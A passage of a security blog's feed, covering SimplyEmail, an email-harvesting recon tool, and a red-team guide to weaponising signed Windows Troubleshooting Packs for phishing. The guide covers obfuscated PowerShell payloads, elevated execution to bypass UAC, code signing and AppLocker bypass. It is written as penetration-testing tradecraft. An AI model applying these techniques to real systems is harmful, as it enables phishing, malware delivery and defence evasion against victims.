&lt;p&gt;&lt;a href=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.13.55-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-21-at-1.13.55-PM.png&#34; alt=&#34;Screen Shot 2015-11-21 at 1.13.55 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;pdfminer&#34;&gt;PDFMiner&lt;/h3&gt;

&lt;p&gt;With some basic requirements in hand I knew I could use the previous built module to handle most of the google search requirements. I just need a few small tweaks and I could start parsing the raw HTML of google for PDF files. Using PDFMiner I was able to convert a bulk of them to Text for parsing.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.14.06-PM.png&#34;&gt;&lt;img src=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.14.06-PM.png&#34; alt=&#34;Screen Shot 2015-11-21 at 1.14.06 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Suppersingly enough this wasn’t as hard as I thought it was going to be! Mainly since the method I use to handle all the background work has been handled for me!&lt;/p&gt;

&lt;p&gt;Expect to see upcoming this month:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Excel Parsing&lt;/li&gt;
&lt;li&gt;Doc / Docx Parsing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As always you can check out the code here: &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Modules/GooglePDFSearch.py&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Modules/GooglePDFSearch.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sample Output and test using the new Verbose options:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    root@vapt-kali:~/Desktop/SimplyEmail# ./SimplyEmail.py -t GooglePDF -e mandiant.com -v
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.22.37-PM.png&#34;&gt;&lt;img src=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.22.37-PM.png&#34; alt=&#34;Screen Shot 2015-11-21 at 1.22.37 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Email Harvesting with SimplyEmail</title>
      <link>http://dev.cybersyndicates.com/2015/11/email-harvesting-with-simplyemail/</link>
      <pubDate>Sat, 21 Nov 2015 14:58:47 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/11/email-harvesting-with-simplyemail/</guid>
      <description>

&lt;h2 id=&#34;email-recon-made-easy&#34;&gt;Email Recon Made Easy&lt;/h2&gt;

&lt;p&gt;More often than not email enumeration is hit or miss, depending on the sources used throttle limits are in place or they just plain don’t index everything. As you may know from my past blog write-up I wrote a HTML scrapper to integrate into theHarvester. After that experience I knew there was for some improvement on 3 major key areas:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Speed - It needed to be able to handle way more locations to search&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Framework – People needed to be able to easily contribute to the project&lt;/li&gt;
&lt;li&gt;Reporting – I wanted it to be elegant and easy to discover the sources&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With these requirements in hand I started my build on SimplyEmail!&lt;/p&gt;

&lt;h3 id=&#34;benefits-of-simplyemail&#34;&gt;Benefits of SimplyEmail&lt;/h3&gt;

&lt;p&gt;In the underlying code I built the program to dynamically load the all modules that where placed in the modules folder. The question is why? Well after using other tools and methods, I found that searching just about anywhere you can get your hands on can be beneficial to the results you obtain (Even if duplicates). In certain cases, Google Captcha block would engage and Yahoo Search would come to save the day! The key here was the ability to run multiple modules at the same time, this proved to be quite an improvement for web intense modules. Here is a small snippet of the code that makes this happen:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;All modules are dynamicaly loaded into a list&lt;/li&gt;
&lt;li&gt;Modules are placed into a Multiprocessing queue&lt;/li&gt;
&lt;li&gt;Execution takes place in a standardized format so that all processing takes place on child process rather than parent&lt;/li&gt;
&lt;li&gt;Results are Parsed with a custom parser that handles about all the raw html and text based parsing you could need.&lt;/li&gt;
&lt;li&gt;These results are placed into a Dictionary with a Key of the source and email address&lt;/li&gt;
&lt;li&gt;Html results are generated on the fly, and raw results are appended to a running list with time stamps.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Multiprocessing Controller:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.36.26-AM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.36.26-AM.png&#34; alt=&#34;Screen Shot 2015-11-17 at 9.36.26 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How the modules are instantiated:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.38.55-AM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.38.55-AM.png&#34; alt=&#34;Screen Shot 2015-11-17 at 9.38.55 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;simple-cli-interface&#34;&gt;Simple CLI Interface:&lt;/h3&gt;

&lt;p&gt;To get started always run the Setup script first:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop/SimplyEmail# sh Setup.sh
or
root@kali:~/Desktop/SimplyEmail# ./Setup.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next take a look at the help menu:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop/SimplyEmail# ./SimplyEmail -h
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.50.39-AM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.50.39-AM.png&#34; alt=&#34;Screen Shot 2015-11-17 at 9.50.39 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Running the tool can be accomplished by either running all modules or one specific module for testing:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop/SimplyEmail# ./SimplyEmail -all -e enron.com

root@kali:~/Desktop/SimplyEmail# ./SimplyEmail -t Google -e enron.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-10.03.13-AM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-10.03.13-AM.png&#34; alt=&#34;Screen Shot 2015-11-17 at 10.03.13 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;understanding-reporting-options&#34;&gt;Understanding Reporting Options:&lt;/h2&gt;

&lt;p&gt;One of the most frustrating aspects of Pen-testing is the tools&amp;rsquo; ability to report the findings and make those easily readable. This may be for the data provided to a customer or just the ability to report on source of the data.&lt;/p&gt;

&lt;p&gt;So I&amp;rsquo;m making it my goal for my tools to take that work off your back and make it as simple as possible! Let&amp;rsquo;s cover the two different reports generated.&lt;/p&gt;

&lt;h3 id=&#34;text-output&#34;&gt;Text Output:&lt;/h3&gt;

&lt;p&gt;With this option results are generated and appended to a running text file called Email_List.txt. this makes it easy to find past searches or export to tool of choice. Example:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-21-at-10.01.52-AM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-21-at-10.01.52-AM.png&#34; alt=&#34;Screen Shot 2015-11-21 at 10.01.52 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;html-output&#34;&gt;HTML Output:&lt;/h3&gt;

&lt;p&gt;As I mentioned before a powerful function that I wanted to integrate was the ability to produce a visually appealing and rich report for the user and potentially something that could be part of data provided to a client. Please let me know with suggestions!&lt;/p&gt;

&lt;h4 id=&#34;email-source&#34;&gt;Email Source:&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-11-at-5.27.15-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-11-at-5.27.15-PM.png&#34; alt=&#34;Screen Shot 2015-11-11 at 5.27.15 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;email-section&#34;&gt;Email Section:&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Html report now shows Alerts for Canary Search Results&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-11-11-at-5.27.31-PM.png&#34; alt=&#34;![Screen Shot 2015-11-11 at 5.27.31 PM](/wp-content/Screen-Shot-2015-11-11-at-5.27.31-PM-1024x528.png)&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>A No Bull Guide to Malicious Windows Trouble Shooting Packs and Application whitelist Bypass</title>
      <link>http://dev.cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</link>
      <pubDate>Fri, 16 Oct 2015 13:36:50 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</guid>
      <description>

&lt;h3 id=&#34;malicious-windows-trouble-shooting-package&#34;&gt;Malicious Windows Trouble Shooting Package&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Using Nicholas Berthaume Recent work on WTP:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href=&#34;https://twitter.com/nberthaume&#34;&gt;@nberthaume&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Just some background on this before we deep dive into setup and construction of the package. I was let onto this a few months back from a coworker. I know this was a pretty cool concept and could see the real world benefit of using something like this on a Red Team in a high security environment. Especially on the phishing side of the house, which I have been doing way more of lately!&lt;/p&gt;

&lt;p&gt;But at the time I only knew that this could be done for malicious use, it does turn out that their was a talk explaining just about everything we are going to cover except a few things. The key here is all the information I gathered and the step-by-step execution was done by research on my own and just trial and error to see how things worked. This is an import aspect of anything in the Red Team space, it requires the knowledge of what you are throwing into a customers environment as well as understanding what type effects its has on the endpoint to truly own your tradecraft. Upon entry into this space everyone is challenged at some point, questions like what command are you running; why?; do you know what that does?; what process will be spawned vs injecting.&lt;/p&gt;

&lt;p&gt;Thats why I took the approach to doing all the research before reaching out to the team for info on where the idea was generated. It seemed to pay off :)&lt;/p&gt;

&lt;h3 id=&#34;ligt-functionality-windows-feature&#34;&gt;Ligt Functionality  (Windows &amp;ldquo;Feature&amp;rdquo;)&lt;/h3&gt;

&lt;p&gt;So what are WTP (Windows Trouble Shooting Packs)? The question is simple to answer: its a simple package software developers can check issues, that could be causing issues with their software. This WTP is mainly used by Microsoft and most of us have used them and maybe just didn&amp;rsquo;t think about it (Troubleshooting Network Issues). I&amp;rsquo;m sure we all have seen this before:&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-09-at-2.36.47-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-09-at-2.36.47-PM.png&#34; alt=&#34;Screen Shot 2015-10-09 at 2.36.47 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Microsofts &lt;em&gt;Signed&lt;/em&gt; Binary Involved (Note this):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msdt &amp;lt;/id &amp;lt;name&amp;gt; | /path &amp;lt;name&amp;gt; | /cab &amp;lt; name&amp;gt;&amp;gt; &amp;lt;&amp;lt;/parameter&amp;gt; [options] … &amp;lt;parameter&amp;gt; [options]&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Some really cool features of msdt:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Is a standard windows signed binary and standard with all deployments&lt;/li&gt;
&lt;li&gt;Allows you to specify paths of the package and even use UNC paths!!!&lt;/li&gt;
&lt;li&gt;Allows for you to use the flag &amp;ldquo;/af&amp;rdquo; to produce a Answers file built in XML to automate the WTP and can also run from a UNC path &amp;ldquo;Potential Lateral Movement&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Answer files can be easily built in Power-shell&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;what-does-the-package-consist-of&#34;&gt;What does the Package consist of?&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/IC306717.jpg&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/IC306717.jpg&#34; alt=&#34;IC306717&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So I stole this image from MSDN and its a great image to understand the basics of a WTP. A few things we need to understand about the package it self. The WTP structure consist of:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Id Metadata&lt;/li&gt;
&lt;li&gt;Detection scripts&lt;/li&gt;
&lt;li&gt;Resolution scripts&lt;/li&gt;
&lt;li&gt;Verification scripts&lt;/li&gt;
&lt;li&gt;Localized scripts&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This format is what builds the &amp;ldquo;Windows Troubleshooting Pack&amp;rdquo; itself , this is what is given to the Runtime Engine and runs through these and display to the user the results of the package. The bottom line is we really don&amp;rsquo;t need all of these scripts unless you will be weaponizing these for a specific phishing campaign that is unique the environment you will be targeting. The cool part is you can basically use this package to deploy just about any code you can dream of, as long as you can some how deploy it with powershell of course.&lt;/p&gt;

&lt;h3 id=&#34;how-to-setup-to-build-your-first-wtp&#34;&gt;How to setup to build your first WTP&lt;/h3&gt;

&lt;p&gt;Lets now cover what we will need to build your first WTP. This can be tricky so follow this to the exact step so you won&amp;rsquo;t encounter any crazy errors as this wasn&amp;rsquo;t easy to figure out. I did use VMware and a clean windows 7 pro VM, so I can&amp;rsquo;t speak for any other platform. But the trick here is that you can build this packages manually which will take FOREVER or use windows SDK package manger to build them.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 1:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Build your VM that is fully patched and latest SP&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We need to install windows specific visual studio and C++ distribution&lt;/p&gt;

&lt;p&gt;YOU MUST USE 2010 Visual Studio&lt;/p&gt;

&lt;p&gt;Download: &lt;a href=&#34;http://microsoft-visual-cpp-express.soft32.com/free-download/&#34;&gt;Link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 3:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Use the following selections&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-9.56.18-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-9.56.18-PM.png&#34; alt=&#34;Screen Shot 2015-10-14 at 9.56.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(Important packages you will be installing so we can install the SDK)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-9.56.57-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-9.56.57-PM.png&#34; alt=&#34;Screen Shot 2015-10-14 at 9.56.57 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 4:&lt;/strong&gt;
So no matter how hard I tired I couldn&amp;rsquo;t get the latest SDK to work so I jumped back to 7.0&lt;/p&gt;

&lt;p&gt;Download: &lt;a href=&#34;http://www.microsoft.com/en-us/download/details.aspx?id=3138&#34;&gt;link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 5:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Check the following boxes so you ensure you install the complete package even though it installs .NET 3.5!&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-10.06.00-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-10.06.00-PM.png&#34; alt=&#34;Screen Shot 2015-10-14 at 10.06.00 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Building your first WTP&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;At this point you should be set up to use the TSPDesigner package that comes with windows SDK.  While this isn&amp;rsquo;t currently easily automated, Nicholas Berthaume talked about releasing a toolkit for linux to build these packages. We will cover some of the tradecraft concerns and case use&amp;rsquo;s in this post in a bit.&lt;/p&gt;

&lt;p&gt;Lets get started by starting up the designer and build out with the wizzard for a quick start.&lt;/p&gt;

&lt;blockquote&gt;Goto All Programs -&gt; Microsoft windows SDK v7.0 -&gt; Tools -&gt; Windows Troubleshooting Pack Designer&lt;/blockquote&gt;

&lt;p&gt;Click on create pack  -&amp;gt; name it &amp;ldquo;Really Bad Here&amp;rdquo; and click on create:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-6.34.40-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-6.34.40-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 6.34.40 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Go right ahead and fill out the package fields (*set URL it won&amp;rsquo;t have to match your code signing cert):&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-6.36.59-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-6.36.59-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 6.36.59 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Before we move forward lets take a quick look at an actually trouble shooting pack, so we have it fresh in our minds of how execution takes place. This structure can give us a great amount of information about where you may want inject your payload of choice. Head over to your kali and download this Microsoft signed Troubleshooting package, we will be unarchiving it in Kali 2.0:&lt;/p&gt;

&lt;p&gt;Download: &lt;a href=&#34;http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab&#34;&gt;Link&lt;/a&gt; or &lt;a href=&#34;http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab&#34;&gt;http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab&lt;/a&gt; if you don&amp;rsquo;t trust me ;)&lt;/p&gt;

&lt;p&gt;Lets take a look at this package of what a potential victim would see if they unpacked it and compared, as you move forward with any tool or technique its important that you understand what right looks like and what your victim could possibly see if they had the right tools.&lt;/p&gt;

&lt;blockquote&gt;Right click on the .diagcab and select Open With Archive Manager, you should see:&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-7.09.07-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-7.09.07-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 7.09.07 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can simply open any package you build with a achieve manager, and see all the unique parts of the package that will be built with the WTP designer. The important concept here is to take a look around at the structure and get an idea of how you would like you package to be built. So as you can see we can easily pull out the unique PS scripts, we may want to obfuscated using some simple power-shell techniques (ex. Encoded base64).&lt;/p&gt;

&lt;p&gt;Lets move onto finishing the setup, and fill in the following. This data will be displayed when the user checks the advanced results  within the package, so make it interesting:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.26.15-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.26.15-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.26.15 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next we will setup what will happen if we discover the root cause. A interesting discovery is the ability to run the package at a elevated level. This could be interesting, so lets select to run this at a elevated context! (This can Bypass UAC)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.29.49-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.29.49-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.29.49 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Set up the Resolver which won&amp;rsquo;t really do anything in our case so don&amp;rsquo;t set elevated privileges:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.31.48-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.31.48-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.31.48 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Using a verifier we can use some simple logic to insure the root cause is fixed.. (Endless possibilities to deploy your initial attack vector.).To keep it simple we won&amp;rsquo;t need to add a Verifier but you will see the logic as we move on:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.39.37-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.39.37-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.39.37 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now lets start by editing your Root Cause PS script to start up notepad.exe as an example. Select &amp;ldquo;Edit TroubleShooter Script&amp;rdquo;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.40.12-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.40.12-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.40.12 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;At this point your built in Power-shell IDE will be launched for simple editing of your logic:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.53.55-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.53.55-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.53.55 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you want to test out a payload its very simple to use CobaltStrikes Payload Generator to build a Staged PS script and just place that code in the logic section to gain code execution (Please note that this section does get executed twice for some reason). If you want to use CobaltStrikes DNS Hybrid listener you can build a fully Staged DNS beacon and export it as a PS script and place that code in the logic area as well.&lt;/p&gt;

&lt;p&gt;Go ahead and hit the save button, and your package is ready to be tested out. We will be starting out using a self signed package for testing and will sign the package in a bit. Remember that a self signed package won&amp;rsquo;t run on any computer other than the one you built it on. SO don&amp;rsquo;t try sending a self signed one out to a target!&lt;/p&gt;

&lt;blockquote&gt;Build -&gt; Build Pack -&gt; Ok -&gt; Yes -&gt; Launch Trouble Shooting Pack&lt;/blockquote&gt;

&lt;p&gt;You should imeidently have Notepad pop and you have code execution!&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.04.14-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.04.14-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.04.14 PM&#34; /&gt;&lt;/a&gt;Now lets explore the detailed info that our target may see when they View Detailed information:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.05.30-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.05.30-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.05.30 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;setup-for-code-signing&#34;&gt;Setup for Code Signing&lt;/h3&gt;

&lt;p&gt;Get a code signing cert: &lt;a href=&#34;https://www.digicert.com/code-signing/&#34;&gt;Here&lt;/a&gt;  ($179 but you can find way cheaper)&lt;/p&gt;

&lt;p&gt;In my case I had a DigiCert Code Signing Cert, that was in a .P7B format which cannot be used with the WTP (Must have the secret key re-Attached to the cert to build a .PFX Cert. This can be a tricky step so I will cover how I generated my .PFX cert before we go into signing the package.&lt;/p&gt;

&lt;p&gt;Using Kali 2.0 built in OpenSSL package we can convert it to the correct format:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl pkcs7 -print_certs -in MyCodeSigningCert.p7b -out certificate.cer
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using this new built .Cer we will now generate our .PFX using our privatekey.key.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl pkcs12 -export -out certificate.pfx -inkey privateKey.key -in certificate.crt -certfile CACert.crt
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;Return back to windows package designer -&gt; Project -&gt; Options -&gt; Specify a Certificate&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.21.46-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.21.46-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.21.46 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You should now be able to Build your package and now have a fully signed package for deployment. In the next image the publisher has been obfuscated so I don&amp;rsquo;t share the world with my cert. At this point its  time to move into testing of our new WTP!&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.24.35-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.24.35-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.24.35 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;application-whitelisting-and-script-bypass-testing&#34;&gt;Application Whitelisting and Script Bypass Testing&lt;/h3&gt;

&lt;p&gt;Lets now setup a hardened environment on our fresh Windows 7 &lt;em&gt;Pro&lt;/em&gt; VM. Using windows Applocker we can easily setup a simulated environment that we can test against.&lt;/p&gt;

&lt;p&gt;Using windows Group Policy editor we can make the correct changes needed ( run Gpcedit.msc ):&lt;/p&gt;

&lt;p&gt;Navigate to: Computer Configuration \ Windows Settings \ Security Settings \ Application Control Policies \ AppLocker&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.37.47-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.37.47-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.37.47 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now we need click on &amp;ldquo;Configure rule enforcement&amp;rdquo; and enable Execution Rules and Script Rules:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.39.32-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.39.32-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.39.32 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next right click Executable Rules -&amp;gt; Create New Rule:&lt;/p&gt;

